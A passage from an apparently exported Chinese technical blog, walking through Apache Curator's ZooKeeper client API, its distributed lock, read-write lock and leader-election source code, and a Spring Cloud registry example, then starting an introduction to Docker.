时，由于其对这些功能都做了高度的封装，使用起来更加简单，不但减少了开发时间，而且增强了程序的可靠性。 在项目中导入依赖：\n&lt;!--包括 curator-framework 包：该包是对ZooKeeper底层API的一些封装    另一个是 curator-recipes 包：该包封装了一些ZooKeeper服务的高级特性，如Cache事件监听、选举、分布式锁、分布式 Barrier--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.curator&lt;/groupId&gt;    &lt;artifactId&gt;curator-recipes&lt;/artifactId&gt;    &lt;version&gt;5.0.0&lt;/version&gt;    &lt;exclusions&gt;        &lt;exclusion&gt;            &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt;            &lt;artifactId&gt;zookeeper&lt;/artifactId&gt;        &lt;/exclusion&gt;    &lt;/exclusions&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.curator&lt;/groupId&gt;    &lt;artifactId&gt;curator-x-discovery&lt;/artifactId&gt;    &lt;version&gt;5.0.0&lt;/version&gt;    &lt;exclusions&gt;        &lt;exclusion&gt;            &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt;            &lt;artifactId&gt;zookeeper&lt;/artifactId&gt;        &lt;/exclusion&gt;    &lt;/exclusions&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt;    &lt;artifactId&gt;zookeeper&lt;/artifactId&gt;    &lt;version&gt;3.5.8&lt;/version&gt;&lt;/dependency&gt;\n\n创建客户端实例public class zkdemo &#123;    CuratorFramework curatorFramework;    @Before    public void before()&#123;         //创建重试策略         RetryPolicy retryPolicy = new ExponentialBackoffRetry(5000, 30);         //构建者模式         curatorFramework = CuratorFrameworkFactory.builder()                 //服务器地址                 .connectString(&quot;192.168.93.128:2181&quot;)                 //重试策略                 .retryPolicy(retryPolicy)                 //会话过期事件                 .sessionTimeoutMs(30 * 1000)                 //会话超时事件                 .connectionTimeoutMs(5000)                 //是否支持只读模式                 .canBeReadOnly(true)                 .build();         curatorFramework.getConnectionStateListenable().addListener(                 (Client, newState) -&gt; &#123;                     if (newState == ConnectionState.CONNECTED) &#123;                         log.info(&quot;连接成功&quot;);                     &#125;                 &#125;         );         //启动客户端 连接服务器         curatorFramework.start();    &#125;&#125;\n\n创建Curator客户端的参数和Zookeeper原生客户端差不多，其中多了两项\n\n重试策略\n\n\n\n\n策略名称\n说明\n\n\n\nExponentialBackoffRetry\n重试一组次数，重试之间的睡眠时间增加\n\n\nRetryNTimes\n重试最大次数\n\n\nRetryOneTime\n只重试一次\n\n\nRetryUntilElapsed\n在给定的时间结束之前重试\n\n\n当客户端异常退出或者与服务端失去连接的时候，可以通过设置客户端重新连接ZooKeeper服务端。\n而 Curator 提供 一次重试、多次重试等不同种类的实现方式。\n在Curator内部，可以通过判断服务器返回keeperException的状态代码来判断是否进行重试处理，如果返回的是OK表示一切操作都没有问题，而SYSTEMERROR表示系统或服务端错误。\n\n超时时间\n\nCurator客户端创建过程中，有两个超时时间的设置。一个是sessionTimeoutMs会话超时时间，用来设置该条会话在ZooKeeper服务端的失效时间。\n另一个是connectionTimeoutMs客户端创建会话的超时时间，用来限制客户端发起一个会话连接到接收ZooKeeper服务端应答的时间。可以理解为参数sessionTimeoutMs 作用在服务端，而connectionTimeoutMs作用在客户端。\n创建节点Curator中采用了流式编程的风格，创建节点的代码如下：\n@Testpublic void createNode() throws Exception &#123;    String path = curatorFramework        .create()        // protection模式，防止由于异常导致僵尸节点        // 会给节点加上一个uuid,可以失败重试并且防止多次创建        .withProtection()         .withMode(CreateMode.PERSISTENT)        //节点名为/test        .forPath(&quot;/test&quot;);    log.info(&quot;path &#123;&#125;&quot;, path);&#125;\n\n另外，Curator可以直接一次性创建带层级结构的节点，而Zookeeper原生客户端不可以：\n@Testpublic void createNode() throws Exception &#123;    String path = curatorFramework        .create()        .creatingParentsIfNeeded()        .withMode(CreateMode.PERSISTENT)        .forPath(&quot;/test/test-son&quot;);    //和单一节点一致的做法    log.info(&quot;path &#123;&#125;&quot;, path);&#125;\n\n获取数据@Test public void getData() throws Exception &#123;     // 在forPath之前可以通过usingWatcher添加Watcher监听，和Zookeeper原生客户端用法一致    byte[] bytes = curatorFramework.getData().forPath(&quot;/test&quot;);     log.info(&quot;get data from node :&#123;&#125;&quot;,new String(bytes)); &#125;\n\n修改节点@Test public void setData() throws Exception &#123;     //参数为 路径  数据Bytes    curatorFramework.setData().forPath(&quot;/test&quot;,&quot;newdata!&quot;.getBytes());     byte[] bytes = curatorFramework.getData().forPath(&quot;/test&quot;);     log.info(&quot;get data from node :&#123;&#125;&quot;,new String(bytes));&#125;\n\n删除节点@Test public void delete() throws Exception &#123;        curatorFramework        .delete()        // guaranteed方法起到一个保障删除成功的作用，其底层工作方式是：        // 只要该客户端的会话有效，就会在后台持续发起删除请求，直到该数据节点在服务端被删除        .guaranteed()         // deletingChildrenIfNeeded方法以递归的方式直接删除其子节点，以及子节点的子节点...        .deletingChildrenIfNeeded()        //对这一路径服务        .forPath(&quot;/test&quot;); &#125;\n\n异步接口Curator引入了BackgroundCallback接口，用来处理服务器端返回来的信息，这个处理过程是在异步线程中调用，默认在Zookeeper原生客户端的EventThread中调用，也可以自定义线程池：\n@Testpublic void testThreadPool() throws Exception &#123;\t// 创建线程池    ExecutorService executorService = Executors.newFixedThreadPool(2);    // 异步获取数据，可传入自定义的线程池    curatorFramework.getData()        .inBackground(        \t(client, event) -&gt; &#123;        \t\tlog.info(&quot; background: &#123;&#125;&quot;, event);    \t\t&#125;        \t,executorService    ).forPath(&quot;/test&quot;); &#125;\n\nCurator Caches（过时）Curator引入了Cache来实现对Zookeeper服务端事件监听，Cache事件监听可以理解为一个本地缓存视图与远程Zookeeper视图的对比过程。并且Cache提供了反复注册的功能。\nCache 分为两类注册类型：节点监听和子节点监听。\n\nNodeCache对某一个节点进行监听\n\n@Testpublic void nodeCache() throws Exception &#123;    // 创建NodeCache    NodeCache nodeCache = new NodeCache(curatorFramework, &quot;/test&quot;);    // 添加NodeCacheListener监听器    nodeCache.getListenable().addListener(() -&gt; &#123;        byte[] bytes = curatorFramework.getData().forPath(&quot;/test&quot;);        log.info(&quot;data &#123;&#125;&quot;, new String(bytes));    &#125;);    // 启动NodeCache    nodeCache.start();&#125;\n\n\nPathChildrenCache 会对子节点进行监听，但是不会对二级子节点进行监听：\n\n@Testpublic void pathChildrenCache() throws Exception &#123;    // 创建PathChildrenCache    PathChildrenCache pathChildrenCache = new PathChildrenCache(curatorFramework, &quot;/test&quot;,true);    // 添加PathChildrenCacheListener监听器    pathChildrenCache.getListenable().addListener((client,event) -&gt; &#123;        log.info(&quot;event &#123;&#125;&quot;, event);    &#125;);    // 如果设置为true则在首次启动时就会缓存节点内容到Cache中    pathChildrenCache.start(true);&#125;\n\n\nTreeCache使用一个内部类TreeNode来维护这个一个树结构。并将这个树结构与Zookeeper节点进行了映射。所以TreeCache可以监听当前节点下所有节点的事件：\n\n@Testpublic void treeCache() throws Exception &#123;    // 创建TreeCache    TreeCache treeCache = new TreeCache(curatorFramework, &quot;/test&quot;);    // 添加TreeCacheListener监听器    treeCache.getListenable().addListener((client,event) -&gt; &#123;        log.info(&quot;event &#123;&#125;&quot;, event);    &#125;);    // 启动TreeCache    treeCache.start();&#125;\n\nZookeeper实战场景分布式锁与Redis一样，Zookeeper也可以实现分布式锁：\n\nRedis中通过SETNX命令可以保证只有一个请求可以成功设置key\nZookeeper中所有的节点都不能被重复创建\n\n所以说，在Zookeeper实现的分布式锁中，获取锁的过程就是创建节点的过程。\n非公平锁Zookeeper实现非公平锁的流程大致如下图所示：\n\n获取锁失败的客户端，可以通过Zookeeper的事件监听机制，监听锁节点，一旦锁节点被删除就可以监听到事件，开始继续获取锁。\n上述的实现看似很完美，但是在并发问题比较严重的情况下，性能会下降的比较厉害。\n主要原因是，所有的连接都在对同一个节点进行监听，当服务器检测到删除事件时，要通知所有的连接，所有的连接同时收到事件，再次并发竞争，这就是羊群效应。\n这种加锁方式是非公平锁的具体实现，非公平锁的羊群效应很难避免，那么可以采取公平锁。\n公平锁实现思路想要实现公平锁，必须要能够实现对所有客户端进行排序。\nRedis中的List结构可以实现队列，那么对应Zookeeper中的顺序节点也可以实现排序的功能：\n\n\n所有的请求到达Zookeeper后首先在锁节点下创建一个顺序节点\n判断自己的节点是不是最小节点，如果是则获取锁成功\n如果不是最小节点，则获取锁失败，并且监听前一个结点\n获得锁的客户端释放锁后，删除自己的顺序结点，后一个客户端会监听到该事件，重复第2步获取锁\n\n借助于临时顺序节点加上事件监听的巧妙设计，可以避免同时多个节点的并发竞争锁，缓解了服务端压力。这种实现方式所有加锁请求都进行排队加锁，是公平锁的具体实现。\nCurator源码分析Curator客户端实现了公平锁，使用方法也很简单：\n// 创建InterProcessMutex对象，它就是公平锁类// 需要传入两个参数：CuratorFramework客户端对象、lock结点名称InterProcessMutex lock = new InterProcessMutex(curatorFramework, &quot;/lock&quot;);// 获取锁，可传入超时时间，如果在指定时间内还没有获取到锁就会返回失败lock.acquire();// 释放锁lock.release();\n\n接着看看acquire获取锁的逻辑：\npublic void acquire() throws Exception&#123;    // 调用internalLock方法，没有传入超时时间就是-1    if ( !internalLock(-1, null) )    &#123;        throw new IOException(            &quot;Lost connection while trying to acquire lock: &quot; + basePath);    &#125;&#125;private boolean internalLock(long time, TimeUnit unit) throws Exception&#123;    // 获取当前线程    Thread currentThread = Thread.currentThread();    // 从缓存threadData尝试获取当前线程    // threadData在后续有解释    LockData lockData = threadData.get(currentThread);    // 如果获取到了，说明是锁【重入】，不是第一次进入了    if ( lockData != null )    &#123;        // 将锁的重入次数+1        lockData.lockCount.incrementAndGet();        // 获取锁成功，直接返回        return true;    &#125;\t// 第一次进入 需要尝试获取锁    // 通过LockInternals的attemptLock方法获取锁    // getLockNodeBytes方法默认返回的是null，留给子类实现    String lockPath = internals.attemptLock(time, unit, getLockNodeBytes());    // 如果获取锁成功    if ( lockPath != null )    &#123;        // 将当前线程信息和锁信息存入threadData缓存，便于锁的重入        LockData newLockData = new LockData(currentThread, lockPath);        threadData.put(currentThread, newLockData);        return true;    &#125;    return false;&#125;\n\nLockInternals的attemptLock方法：\nString attemptLock(long time, TimeUnit unit, byte[] lockNodeBytes) throws Exception   &#123;       // 相对不重要的参数       final long      startMillis = System.currentTimeMillis();       final Long      millisToWait = (unit != null) ? unit.toMillis(time) : null;       final byte[]    localLockNodeBytes = (revocable.get() != null) ? new byte[0] : lockNodeBytes;       int             retryCount = 0;       String          ourPath = null;       boolean         hasTheLock = false;       boolean         isDone = false;       // 循环       while ( !isDone )       &#123;           isDone = true;           try           &#123;               // 通过StandardLockInternalsDriver的createsTheLock方法创建锁结点               // 只是创建结点，并不一定能获取到锁               ourPath = driver.createsTheLock(client, path, localLockNodeBytes);               // 通过internalLockLoop方法判断是否获取到锁               hasTheLock = internalLockLoop(startMillis, millisToWait, ourPath);           &#125;           catch ( KeeperException.NoNodeException e )           &#123;               ....           &#125;       &#125;       // 如果获取到锁       if ( hasTheLock )       &#123;           // 返回锁结点路径           return ourPath;       &#125;       return null;   &#125;\n\nStandardLockInternalsDriver的createsTheLock方法创建锁结点：\npublic String createsTheLock(CuratorFramework client, String path, byte[] lockNodeBytes) throws Exception&#123;    String ourPath;    // 这里传入的lockNodeBytes默认为null，所以会进入else    if ( lockNodeBytes != null )    &#123;        ourPath = client.create().creatingParentContainersIfNeeded().withProtection().withMode(CreateMode.EPHEMERAL_SEQUENTIAL).forPath(path, lockNodeBytes);    &#125;    else    &#123;        // 通过Curator客户端创建节点        ourPath = client.create()            .creatingParentContainersIfNeeded() // 创建的锁节点是容器节点            .withProtection() // 通过Protection模式创建，防止僵尸节点            .withMode(CreateMode.EPHEMERAL_SEQUENTIAL) // 每个客户端创建的是临时顺序节点            .forPath(path);     &#125;    return ourPath;&#125;\n\n\nCurator客户端创建顺序节点成功后，如果由于网络问题没有收到服务器的返回结果，会进行重试，如果不进行任何处理操作，那么会创建一个新的顺序节点，那么之前的节点就被称为僵尸节点。\nCurator提供了一种Protection模式，创建节点时会给节点加一个uuid作为前缀，由于网络问题没有收到服务器的返回结果进行重试的时候，会先用uuid检查是否已经创建过，这样就可以防止僵尸节点的产生。 \n\n创建完节点后，再回到LockInternals的internalLockLoop节点判断是否能获取锁：\nprivate boolean internalLockLoop(long startMillis, Long millisToWait, String ourPath) throws Exception   &#123;       boolean     haveTheLock = false;       boolean     doDelete = false;       try       &#123;          ...          while ( (client.getState() == CuratorFrameworkState.STARTED) &amp;&amp; !haveTheLock )          &#123;                              // 通过getSortedChildren方法获得锁节点下的所有顺序节点               // 并且按照序号从小到大排序               List&lt;String&gt;  children = getSortedChildren();               // 获取顺序节点名称，截去父节点               String   sequenceNodeName                    = ourPath.substring(basePath.length() + 1);               //  通过StandardLockInternalsDriver的getsTheLock方法判断是否获取到锁              // 如果获取锁失败，会返回当前顺序结点的前一个结点              // 如果获取锁成功，会返回null              // 公平锁的话这里传入的maxLeases=1               PredicateResults    predicateResults = driver.getsTheLock(client, children, sequenceNodeName, maxLeases);                             // 如果获取到锁               if ( predicateResults.getsTheLock() )               &#123;                   haveTheLock = true;               &#125;              // 如果没获取到锁               else               &#123;                   // 得到当前顺序结点的前一个结点路径，也就是需要监听的结点                   String  previousSequencePath = basePath + &quot;/&quot; + predicateResults.getPathToWatch();                   synchronized(this)                   &#123;                       try                       &#123;                           // 通过Curator客户端添加监听，监听的是当前顺序节点的前一个结点                           client.getData()                               .usingWatcher(watcher)                               .forPath(previousSequencePath);                           if ( millisToWait != null )                           &#123;                               millisToWait -= (System.currentTimeMillis() - startMillis);                               startMillis = System.currentTimeMillis();                               if ( millisToWait &lt;= 0 )                               &#123;                                   doDelete = true;    // timed out - delete our node                                   break;                               &#125;\t\t\t\t\t\t\t// 线程等待                               // 当监听到前一个顺序结点被删除的事件后                               // 监听器会通过notify唤醒当前线程                               wait(millisToWait);                           &#125;                           else                           &#123;                               wait();                           &#125;                       &#125;                       ...                   &#125;               &#125;           &#125;       &#125;       ...       return haveTheLock;   &#125;\n\nStandardLockInternalsDriver的getsTheLock方法判断是否获取到锁：\n   // 公平锁的话这里传入的maxLeases=1，在创建InterProcessMutex对象时确定public PredicateResults getsTheLock(CuratorFramework client, List&lt;String&gt; children, String sequenceNodeName, int maxLeases) throws Exception   &#123;       // 获取当前顺序结点的索引       int             ourIndex = children.indexOf(sequenceNodeName);       validateOurIndex(sequenceNodeName, ourIndex);\t   // 如果索引小于1，也就是索引为0 [maxLeases=1]       boolean         getsTheLock = ourIndex &lt; maxLeases;       // 说明当前线程排在第一个，可以获取锁       // 否则不能获取锁，需要监听前一个顺序结点       String          pathToWatch = getsTheLock ? null : children.get(ourIndex - maxLeases);       return new PredicateResults(pathToWatch, getsTheLock);   &#125;\n\n小结Curator公平锁的实现流程大致如下：\n\nzookeeper和redis区别两者做分布式锁的区别在于两者的集群结构不一致\nredis是主从分布结构，写入时是在Master中写入，然后再同步到到从机中\nzookeeper是Leader和Follower结构，每次写入是需要根据Follower写入成功的次数进行判断的【比如有三个Follower，需要3&#x2F;2+1&#x3D;2，也就是两个Follower写入成功才被认为写入成功。【也被称为zb协议\n那么在redis中如果写入成功，但是还未完成同步时宕机了，那么也就导致信息丢失了。\n读写锁前面这两种加锁方式有一个共同的特质，就是都是互斥锁，同一时间只能有一个请求占用，如果是大量的并发上来，性能是会急剧下降的。Curator还实现了读写锁，在读多写少的情况下性能会有很大提升。\n实现思路读写锁和公平锁的思路类似，同样需要借助顺序节点实现：\n\n根据读写锁的特性，之前公平锁的监听方式需要稍作修改：\n\n读节点监听在它前面最近的一个写节点\n写节点监听它的前一个节点，和公平锁一样\n\n这样就可以实现一个读写锁。\nCurator源码分析Curator客户端实现了读写锁，使用方法也很简单：\n// 创建读写锁InterProcessReadWriteLock lock =     new InterProcessReadWriteLock(curatorFramework, &quot;/readwritelock&quot;);// 读锁InterProcessMutex readLock = lock.readLock();// 写锁InterProcessMutex writeLock = lock.writeLock();// 获取读锁readLock.acquire();// 释放读锁readLock.release();// 获取写锁writeLock.acquire();// 释放写锁writeLock.release();\n\n首先来看一下读写锁InterProcessReadWriteLock的构造方法：\npublic InterProcessReadWriteLock(CuratorFramework client, String basePath, byte[] lockData)&#123;    lockData = (lockData == null) ? null : Arrays.copyOf(lockData, lockData.length);    // 写锁    writeMutex = new InternalInterProcessMutex    (        client,        basePath,        WRITE_LOCK_NAME,        lockData,        // 这里是区分读写锁的关键，写锁传入的是1        1,        new SortingLockInternalsDriver()        &#123;            @Override            // 这里重写了StandardLockInternalsDriver的getsTheLock方法            public PredicateResults getsTheLock(CuratorFramework client, List&lt;String&gt; children, String sequenceNodeName, int maxLeases) throws Exception            &#123;                // 直接调用原来的方法，相当于没重写                return super.getsTheLock(client, children, sequenceNodeName, maxLeases);            &#125;        &#125;    );    // 读锁    readMutex = new InternalInterProcessMutex    (        client,        basePath,        READ_LOCK_NAME,        lockData,        // 这里是区分读写锁的关键，读锁传入的是Integer.MAX_VALUE        Integer.MAX_VALUE,        new SortingLockInternalsDriver()        &#123;            @Override            // 这里重写了StandardLockInternalsDriver的getsTheLock方法            public PredicateResults getsTheLock(CuratorFramework client, List&lt;String&gt; children, String sequenceNodeName, int maxLeases) throws Exception            &#123;                // 调用了readLockPredicate方法                return readLockPredicate(children, sequenceNodeName);            &#125;        &#125;    );&#125;\n\n写锁的创建和执行流程和公平锁几乎一模一样，都是获取锁失败失败监听前一个结点。\n但是读锁略有不同，它在获取锁失败后需要，监听在它之前最近的一个写结点。\n读锁创建时，重写了StandardLockInternalsDriver的getsTheLock方法，该方法用于判断是否获取到锁并且添加监听。重写的方法回调用InterProcessReadWriteLock的readLockPredicate方法：\nprivate PredicateResults readLockPredicate(List&lt;String&gt; children, String sequenceNodeName) throws Exception &#123;     if ( writeMutex.isOwnedByCurrentThread() )     &#123;         return new PredicateResults(null, true);     &#125;     int         index = 0;     int         firstWriteIndex = Integer.MAX_VALUE;     int         ourIndex = -1;     // 遍历锁结点下的所有顺序结点     for ( String node : children )     &#123;         // 如果当前节点是写节点         if ( node.contains(WRITE_LOCK_NAME) )         &#123;             // 记录它的索引             firstWriteIndex = Math.min(index, firstWriteIndex);         &#125;         // 如果当前节点就是自己         else if ( node.startsWith(sequenceNodeName) )         &#123;             // ourIndex表示自己的位置             ourIndex = index;             // 退出循环             break;         &#125;// 索引加1         ++index;     &#125;     StandardLockInternalsDriver.validateOurIndex(sequenceNodeName, ourIndex);     // 如果自己的索引小于第一个写节点的索引，表示前面没有写节点，直接获取锁     // 否则需要接听该写节点     boolean     getsTheLock = (ourIndex &lt; firstWriteIndex);     String      pathToWatch = getsTheLock ? null : children.get(firstWriteIndex);     return new PredicateResults(pathToWatch, getsTheLock); &#125;\n\n按照以上代码的逻辑，就实现了读锁的共享。\nLeader选举\n这里的Leader选举并不是Zookeeper集群中的Leader选举。\n\n在分布式场景中，我们常常会启动很多微服务节点作为一个微服务集群，它们的代码都是一样的，只是用作负载均衡。但是如果我们要进行类似缓存预热的操作，只需要一个微服务节点进行操作，该如何操作？\n【也就是从集群中找一个节点来提供服务  \n其实分布式锁就可以实现，但是Curator为我们提供了一个更加方便的Leader选举功能：\n// 创建一个LeaderSelectorListenerAdapterLeaderSelectorListener listener = new LeaderSelectorListenerAdapter()&#123;    // 实现takeLeadership方法    // 如果当前节点成为了Leader，就会执行该方法    @Override    public void takeLeadership(CuratorFramework client) throws Exception    &#123;\t\t// 执行业务逻辑，比如缓存预热    &#125;&#125;;// 创建一个LeaderSelector节点选举器// 传入参数：Curator客户端、一个节点路径、LeaderSelectorListenerAdapter对象LeaderSelector selector = new LeaderSelector(curatorFramework, &quot;/leader&quot;, listener);// 如果调用了autoRequeue方法，那么选出的Leader节点执行完takeLeadership方法后会开始下一轮选举// 如果没调用autoRequeue方法，只会进行一轮选举selector.autoRequeue(); // 开始选举selector.start();\n\nLeader选举功能的实现其实就是基于锁的，不过该功能的使用场景较少，在一些特殊场景可能会用到。\n注册中心用Zookeeper实现注册中心是非常常见的一个应用场景。\n在复杂的微服务系统中，各个微服务节点都有自己不同的IP和端口号，并且在复杂的调用关系中，维护每个微服务节点的地址是一件不容易的事情，特别是在风云多变的网络环境中。\n所以使用注册中心，用于管理、维护整个系统的服务，并且便于服务间的调用，还是非常必要的。\n原理简介Zookeeper实现注册中的原理其实并不复杂。假设A服务要调用B服务：\n\nB服务集群启动后，每个微服务节点向Zookeeper中创建一个临时节点，比如：\n\n# 假设服务B集群有三个微服务节点# 节点路径             # 节点内容service-B/node1  &#123;&quot;ip&quot;:&quot;192.168.77.88&quot;,&quot;port&quot;:&quot;8081&quot;&#125;service-B/node2  &#123;&quot;ip&quot;:&quot;192.168.77.89&quot;,&quot;port&quot;:&quot;8082&quot;&#125;service-B/node3  &#123;&quot;ip&quot;:&quot;192.168.77.90&quot;,&quot;port&quot;:&quot;8083&quot;&#125;\n\n\n由于是临时节点，服务需要每隔一段时间向Zookeeper发送一次心跳，用于通知自己状态正常。如果Zookeeper超过一定时间没有收到某个节点的心跳，会将该节点删除。\nA服务监听B服务集群在Zookeeper中的节点，将数据缓存在本地。一旦B服务集群状态有了变化，可以立刻收到事件通知，修改缓存。\nA服务调用B服务时，直接从本地缓存中就可以拿到B服务集群中所有节点的地址，可以进行负载均衡、失败重试等操作。\n\n在zookeeper中，进行服务注册，实际上就是在zookeeper中创建了一个znode节点，该节点存储了该服务的IP、端口、调用方式(协议、序列化方式)等。\n该节点承担着最重要的职责，它由服务提供者(发布服务时)创建，以供服务消费者获取节点中的信息，从而定位到服务提供者真正网络拓扑位置以及得知如何调用。\n同时zookeeper服务需要对服务的宕机和新增进行信息更新，这就是zookeeper的监听机制了，由于zookeeper使用的是临时节点，那么需要服务端给节点发送心跳，如果心跳终止，那么认为节点宕机了，需要删除节点。\n此时客户端由于监听了节点信息，发现某个节点消失，那么会更新本地缓存信息，同时再次监听节点。\nSpring Cloud案例之前在介绍Dubbo的时候，我们就通过Zookeeper作为注册中心搭建了一个最简单的微服务架构。其实Spring Cloud也支持使用Zookeeper作为注册中心。我们就通过Zookeeper作为注册中心搭建一个简单的Spring Cloud架构：\n消费端\n导入依赖\n\n&lt;!-- spring boot--&gt;&lt;parent&gt;   &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;   &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;   &lt;version&gt;2.3.5.RELEASE&lt;/version&gt;   &lt;relativePath/&gt; &lt;/parent&gt;&lt;dependencies&gt;    &lt;!-- spring boot web模块 --&gt;\t&lt;dependency&gt;\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;\t&lt;/dependency&gt;    &lt;!-- zookeeper注册中心 --&gt;\t&lt;dependency&gt;\t\t&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\t\t&lt;artifactId&gt;spring-cloud-starter-zookeeper-discovery&lt;/artifactId&gt;\t&lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- spring cloud--&gt;&lt;dependencyManagement&gt;\t&lt;dependencies&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;\t\t\t&lt;version&gt;Hoxton.SR8&lt;/version&gt;\t\t\t&lt;type&gt;pom&lt;/type&gt;\t\t\t&lt;scope&gt;import&lt;/scope&gt;\t\t&lt;/dependency&gt;\t&lt;/dependencies&gt;&lt;/dependencyManagement&gt;\n\n\n配置文件\n\nserver.port=8080spring.application.name=consumer# zookeeper 连接地址spring.cloud.zookeeper.connect-string=192.168.74.88:2181\n\n\n启动类\n\n@SpringBootApplicationpublic class UserCenterApplication &#123;    public static void main(String[] args) &#123;        SpringApplication.run(UserCenterApplication.class, args);    &#125;    // 注入RestTemplate用于http调用    @Bean    // 加上@LoadBalanced注解可以实现负载均衡    @LoadBalanced    public RestTemplate restTemplate() &#123;        RestTemplate restTemplate = new RestTemplate();         return restTemplate;    &#125;&#125;\n\n\nController\n\n@RestControllerpublic class ConsumerController &#123;    @Autowired    private RestTemplate restTemplate;    // 注入负载均衡客户端    @Autowired    private LoadBalancerClient loadBalancerClient;    @GetMapping(&quot;/test&quot;)    public String test() &#123;        // 通过负载均衡客户端可以用过服务名称，查看服务地址        // 能实现这样的功能就是因为注册中心        ServiceInstance choose = loadBalancerClient.choose(&quot;server&quot;);        String serviceId = choose.getServiceId();        int port = choose.getPort();        System.out.println(serviceId + &quot; : &quot;+port);        // 通过restTemplate调用服务端        // 直接通过服务名就能够调用        return restTemplate.getForObject(&quot;http://service/getinfo&quot;, String.class);    &#125;&#125;\n\n服务端\n导入依赖：与消费端相同\n配置文件\n\nserver.port=8082spring.application.name=server# zookeeper 连接地址spring.cloud.zookeeper.connect-string=192.168.74.88:2181# 将本服务注册到zookeeperspring.cloud.zookeeper.discovery.register=true# 配置会话超时时间spring.cloud.zookeeper.session-timeout=30000\n\n\n启动类省略\nController\n\n@RestControllerpublic class ServerController &#123;   @GetMapping(&quot;/getinfo&quot;)   public String getServerPortAndName()&#123;      return &quot;调用成功&quot;;   &#125;&#125;","tags":["2021"]},{"title":"Docker","url":"/2021/11/04/2021/docker/","content":"\n\nDocker简介什么是虚拟化在计算机中，虚拟化（Virtualization）是一种资源管理技术，是将计算机的各种实体资源，如服务器、网络、内存及存储等，予以抽象、转换后呈现出来，打破实体结构间的不可切割的障碍，使用户可以比原本的组态更好的方式来应用这些资源。这些资源的新虚拟部份是不受现有资源的架设方式，地域或物理组态所限制。一般所指的虚拟化资源包括计算能力和资料存储。\n在实际的生产环境中，虚拟化技术主要用来解决高性能的物理硬件产能过剩和老的旧的硬件产能过低的重组重用，透明化底层物理硬件，从而最大化的利用物理硬件对资源充分利用。\n虚拟化技术种类很多，例如：软件虚拟化、硬件虚拟化、内存虚拟化、网络虚拟化(vip)、桌面虚拟化、服务虚拟化、虚拟机等等。\n什么是DockerDocker 是一个开源项目，诞生于 2013 年初，最初是 dotCloud 公司内部的一个业余项目。它基于 Google 公司推出的 Go 语言实现。 项目后来加入了 Linux 基金会，遵从了 Apache 2.0 协议，项目代码在 GitHub 上进行维护。\nDocker 自开源后受到广泛的关注和讨论，以至于 dotCloud 公司后来都改名为 Docker Inc。Redhat 已经在其 RHEL6.5 中集中支持 Docker；Google 也在其 PaaS 产品中广泛应用。\nDocker 项目的目标是实现轻量级的操作系统虚拟化解决方案。 Docker 的基础是 Linux 容器（LXC）等技术。\n在 LXC 的基础上 Docker 进行了进一步的封装，让用户不需要去关心容器的管理，使得操作更为简便。用户操作 Docker 的容器就像操作一个快速轻量级的虚拟机一样简单。\n为什么选择Docker\n上手快\n\n用户只需要几分钟，就可以把自己的程序“Docker化”。Docker依赖于“写时复制”（copy-on-write）模型，使修改应用程序也非常迅速，可以说达到“随心所致，代码即改”的境界。\n随后，就可以创建容器来运行应用程序了。大多数Docker容器只需要不到1秒中即可启动。由于去除了管理程序的开销，Docker容器拥有很高的性能，同时同一台宿主机中也可以运行更多的容器，使用户尽可能的充分利用系统资源。\n\n职责的逻辑分类\n\n使用Docker，开发人员只需要关心容器中运行的应用程序，而运维人员只需要关心如何管理容器。Docker设计的目的就是要加强开发人员写代码的开发环境与应用程序要部署的生产环境一致性。从而降低那种“开发时一切正常，肯定是运维的问题（测试环境都是正常的，上线后出了问题就归结为肯定是运维的问题）”\n\n快速高效的开发生命周期\n\nDocker的目标之一就是缩短代码从开发、测试到部署、上线运行的周期，让你的应用程序具备可移植性，易于构建，并易于协作。（通俗一点说，Docker就像一个盒子，里面可以装很多物件，如果需要这些物件的可以直接将该大盒子拿走，而不需要从该盒子中一件件的取。）\n\n鼓励使用面向服务的架构\n\nDocker还鼓励面向服务的体系结构和微服务架构。Docker推荐单个容器只运行一个应用程序或进程，这样就形成了一个分布式的应用程序模型，在这种模型下，应用程序或者服务都可以表示为一系列内部互联的容器，从而使分布式部署应用程序，扩展或调试应用程序都变得非常简单，同时也提高了程序的内省性。（当然，也可以在一个容器中运行多个应用程序）\n容器与虚拟机比较下面的图片比较了 Docker 和传统虚拟化方式的不同之处，可见容器是在操作系统层面上实现虚拟化，直接复用本地主机的操作系统，而传统方式则是在硬件层面实现。\n与传统的虚拟机相比，Docker优势体现为启动速度快、占用体积小。\nDocker组件Docker服务器与客户端Docker是一个客户端-服务器（C&#x2F;S）架构程序。Docker客户端只需要向Docker服务器或者守护进程发出请求，服务器或者守护进程将完成所有工作并返回结果。Docker提供了一个命令行工具Docker以及一整套RESTful API。你可以在同一台宿主机上运行Docker守护进程和客户端，也可以从本地的Docker客户端连接到运行在另一台宿主机上的远程Docker守护进程。\n\nDocker镜像与容器镜像是构建Docker的基石。用户基于镜像来运行自己的容器。镜像也是Docker生命周期中的“构建”部分。\n镜像是基于联合文件系统的一种层式结构，由一系列指令一步一步构建出来。也可以将镜像当作容器的“源代码”。镜像体积很小，非常“便携”，易于分享、存储和更新。\nDocker可以帮助你构建和部署容器，你只需要把自己的应用程序或者服务打包放进容器即可。容器是基于镜像启动起来的，容器中可以运行一个或多个进程。我们可以认为，镜像是Docker生命周期中的构建或者打包阶段，而容器则是启动或者执行阶段。 